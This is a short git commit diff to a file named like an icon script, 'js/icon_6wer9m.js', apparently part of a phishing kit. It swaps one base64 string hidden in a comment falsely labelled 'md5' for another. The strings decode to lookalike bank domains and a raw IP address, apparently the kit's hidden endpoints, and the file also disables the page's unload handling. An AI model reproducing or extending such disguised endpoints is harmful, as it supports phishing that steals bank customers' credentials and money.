85f865dafa43ae7b7324e7f12cda63c1a33d6f02
caocao <caocaodajun@gmail.com>
2022-09-02 23:41:06 +0800

    init

--- js/icon_6wer9m.js
+++ js/icon_6wer9m.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cubWJiYW5rZC5jb20v**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cubWJiYW5rbi5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
